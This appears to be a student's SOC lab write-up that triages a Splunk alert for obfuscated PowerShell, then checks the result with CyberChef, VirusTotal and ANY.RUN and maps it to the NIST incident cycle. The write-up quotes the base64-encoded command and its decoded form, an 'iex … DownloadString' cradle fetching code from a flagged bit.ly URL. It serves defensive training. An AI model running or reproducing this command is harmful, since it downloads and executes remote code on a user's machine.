
<h1>SOC-Lab-Incident-report </h1>

 

<h2>Introduction/Description</h2>
This project consists of a virtual lab SOC event simulation that I created. For this lab I was presented with log data that would purposely trigger an alert on the SIEM tool(Splunk) that was running on my network. With the snapshots of data and tools that I used to investigate this alert. I will walk you through my thought process of how I triaged this whole event.
<br />


<h2>Languages and Utilities Used</h2>

- <b>PowerShell</b>
- <b>Splunk</b>
- <b>Linux VM</b>
- <b>Windows sandbox vm</b>
- <b>ANY.RUN(Sand Box Tool)</b>
- <b>Virus Total</b>
- <b>Cyber Chef</b>
<h2>Environments Used </h2>

- <b>Windows 7 sandbox VM</b>
- <b>Linux VM </b>


<h2>Program walk-through:</h2>

<p align="left">
 
## SPLUNK EVENT ALERT:
<img src="https://i.imgur.com/TtKAjut.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
 <br />As shown in the splunk window, this is the event for the alert that we received in splunk. The alert I received was for an execution of a process that is Obfuscated. In the splunk event viewer you can see the information provided such as time and date of the event, event Id, name of the user, username login of the user, type of ingested log data and more.
<br />

## SPLUNK EVENT ALERT :
<img src="https://i.imgur.com/258BqEd.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
 
<br />As you scroll down in the event viewer window in splunk you are given more information about the event. Here you can see the process information such as the "Creator process name"= C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe and the "Process Command line": "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"-enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYgBpAHQALgBsAHkALwBlADAATQB3ADkAdwAiACkA. This obfuscated command line is what caused our alert in splunk and is what we are going to be investigating. :
<br />



## CYBER CHEF: <br/>
<img src="https://imgur.com/YPxZFGM.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br /> As you take a look at the process command line you can see that it obfuscated. After .exe which is the execute process you can see that it has -enc to encode the actual execution. So to see what the process command line is trying to do we need to decode it to see if it is malicious. As you can see I used a decryption tool called cyber chef. The output result I would get would be "iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")" which basically directs a user to the specified URL listed and allows them to download contents of the listed URL.
<br />

## VIRUS TOTAL REPORT:  <br/>
<img src="https://i.imgur.com/TalzEiR.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br /> As we continue with this investigation we can already see that this is suspicious activity on the network. First the process command line was Obfuscated and Second we found out that execution of the process command line leads the user to URL which allows them to download unknown files. The next step in our investigation is to check and see if the website from the process is malicious or not. I did this with a tool called Virus total and the results would confirm that the website is indeed malicious. In the report it gave me a score of 11/90. Which means that 11 security vendors have marked this domain name as malicious.

<br />
 
 ## INVESTIGATION REPORT: <br/>
<img src="https://imgur.com/pTrCtro.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
<br /> After my triage of this event and confirming that this is a malicious act on the network I then created an investigation report. In a real life scenario the report would be sent to the incident response team in my SOC.
<br />

## SANDBOX RESULTS:  <br/>
<img src="https://imgur.com/xHssB4C.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>  
<br /> After completion of my investigation report on the incident. I decided to do some analysis on the Malicious domain. I used a sandbox tool called ANY.RUN. What I learned about this malicious domain is that when you go to this site there are connections to a lot of different IP addresses that are outside of the United states. With further investigation with virus total I found out that some of the IP addresses with these connections have been marked as malicious. I was also able to find out with further investigation that some of the IP addresses that are not marked as malicious have connections and communications  with malicious files. Below is one of the malicious files an IP address that resonates from Germany has a connection with. This IP address was also making connections to the same Domain that was investigated in my report. This is one of the few Ip Address that were either marked as malicious or have been reported on virus total as an IP address that has connections and communications with malicious files.
<br />
<img src="https://imgur.com/ElTze1c.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>


## SAND BOX THREAT ALERTS:  <br/>
<img src="https://imgur.com/5ffb460.png" height="80%" width="80%" alt="Disk Sanitization Steps"/> <br/> Towards the end of my analysis I wasn't able to find any actual attacks to the system. However I was able to find a lot of suspicious activity that was taking place on the system when a user visited that domain. The only threat alert I found on the sandbox was a potentially bad traffic alert. This also ran the iexplore.exe process which could have allowed the malicious actor access to potentially do some phsising while a user is on that domain. I would however recommend the incident response team to run a more comprehensive analysis since that is what they specialize in.

#### Utilizing Computer Incident Handling Guide
<img src="https://imgur.com/5wt02wN.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>


<h2>NIST INCIDENT CYCLE</h2>

 
 - <b> PREPARATION: In preparation for this lab I had to configure my SIEM TOOL splunk. I also had to make sure that the alert for an obfuscated  process command line was in my list of alerts . Last thing I had to do was ingest this specific log data to trigger this alert on my splunk. </b>
- <b> DETECTION/ANALYSIS: The detection portion of this lab was all done through my splunk tool. As soon as the requirements for the alert were met it notified me immediately on my SIEM tool. The analysis portion was done with hands-on interaction with the event in splunk. This consisted of me decrypting the obfuscated process with the tool Cyber chef. Some more analysis that I completed during my investigation was scanning the domain obtained from the process. As shown in the lab I used virus total to confirm that the Domain is malicious. Other analysis that I conducted Include a deeper investigation of the confirmed malicious domain in the sandbox tool ANY.RUN. </b>
- <b> CONTAINMENT ERADICATION AND RECOVERY: The steps taken for containment,eradication and recovery all depend on organizations methods and policies. But a general overview would be disconnecting the computer from the network for containment. For eradication it could start from just running an anti malware and virus program to locate malicious files and remove them to possibly re imaging the computers operating system and installing it all over again depending on how bad the host is infected. </b>
- <b> POST INCIDENT ACTIVITY: In this example scenario we had a user process an obfuscated command on their host computer that led to a malicious domain. With Proper investigation we were able to find out information about the malicious activity on the network. All documented information would be shared with all stakeholders within the company where remediation and prevention techniques can be implemented on an incident like this or any similar scenarios. In conclusion the post Incident activity would play as an informative lesson on a malicious event like this.   </b>


</p>

<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
--!>

